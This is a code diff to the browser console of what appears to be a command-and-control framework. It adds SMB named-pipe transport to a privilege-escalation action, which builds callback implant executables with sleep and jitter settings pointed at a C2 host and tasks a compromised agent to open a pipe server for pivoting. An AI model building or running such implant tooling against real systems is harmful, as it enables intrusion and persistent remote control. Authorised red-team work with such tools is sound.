@@ -3898,7 +3898,7 @@ async function runCtxAction(act) {
         const tasks = [api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:effectivePipeName})];
         if (!existingPayload) {
           tasks.push(api('POST', '/api/build', {
-            lang: preferredLang('smb'), format:'exe', transport:'smb',
+            lang: preferredLang('smb', agnt?.language), format:'exe', transport:'smb',
             smb_pipe: pipeUNC, server_url: serverURL,
             sleep_sec:5, jitter_pct:10, output_name: effectiveOutName,
           }));
@@ -4058,22 +4058,56 @@ async function runCtxAction(act) {
             const outName = `agent_priv_${suffix}.exe`;
             const c2host  = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(_){return '127.0.0.1';} })();
             const transport = vals.transport || 'http';
-            const portMap   = {http:'8080', https:'443', tcp:'4444'};
-            const scheme    = transport === 'tcp' ? 'tcp' : transport;
-            const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
             openConsoleFor(aid);
-            addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
-            const buildR = await api('POST', '/api/build', {
-              lang: preferredLang(transport), format:'exe', transport, server_url: serverURL,
-              sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
-              output_name: outName,
-            });
-            if (!buildR?.ok) {
-              addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
-              return;
+
+            if (transport === 'smb') {
+              // SMB named pipe: start pipe server on parent + build agent with pipe UNC
+              const pipeName = `priv_${suffix}`;
+              const pipeUNC  = `\\\\${host}\\pipe\\${pipeName}`;
+              const srvURL   = `http://${c2host}:8080`;
+              addConsoleOutputForAgent(aid, `[privesc] Starting pipe server ${pipeName} on parent…`, '', null);
+              addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → pipe:${pipeUNC}`, '', null);
+              const [pipeR, buildR] = await Promise.all([
+                api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:pipeName}),
+                api('POST', '/api/build', {
+                  lang: preferredLang('smb', agnt?.language), format:'exe', transport:'smb',
+                  smb_pipe: pipeUNC, server_url: srvURL,
+                  sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
+                  output_name: outName,
+                }),
+              ]);
+              if (!pipeR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ PIPE_START failed: ${pipeR?.error||'error'}`,null);
+                return;
+              }
+              addConsoleOutputForAgent(aid, `[privesc] ✓ PIPE_START dispatched`, '', null);
+              if (!buildR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
+                return;
+              }
+              const parentSleepSec = agnt?.sleep_sec || 5;
+              const waitMs = Math.max(20000, (parentSleepSec + 15) * 1000);
+              addConsoleOutputForAgent(aid, `[privesc] Waiting ${Math.round(waitMs/1000)}s for pipe server (agent sleep=${parentSleepSec}s)…`, '', null);
+              await new Promise(r => setTimeout(r, waitMs));
+              payloadName = outName;
+              addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
+            } else {
+              const portMap   = {http:'8080', https:'443', tcp:'4444'};
+              const scheme    = transport === 'tcp' ? 'tcp' : transport;
+              const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
+              addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
+              const buildR = await api('POST', '/api/build', {
+                lang: preferredLang(transport), format:'exe', transport, server_url: serverURL,
+                sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
+                output_name: outName,
+              });
+              if (!buildR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
+                return;
+              }
+              payloadName = outName;
+              addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
             }
-            payloadName = outName;
-            addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
           } else {
             openConsoleFor(aid);
           }
@@ -11151,11 +11185,12 @@ function setImplantLang(lang) {
 
 // Returns the user's preferred agent lang, with optional override for SMB
 // (Rust/C don't have SMB transport yet — fall back to nim for those builds).
-function preferredLang(forTransport) {
-  let lang = 'nim';
-  try { lang = localStorage.getItem('eg_agent_lang') || 'nim'; } catch(_) {}
-  const noSmb = (lang === 'rust' || lang === 'c');
-  if (noSmb && forTransport === 'smb') return 'nim';
+function preferredLang(forTransport, parentLang) {
+  let lang = parentLang || 'nim';
+  if (!parentLang) {
+    try { lang = localStorage.getItem('eg_agent_lang') || 'nim'; } catch(_) {}
+  }
+  if (lang === 'rust' && forTransport === 'smb') return 'go';
   return lang;
 }
 
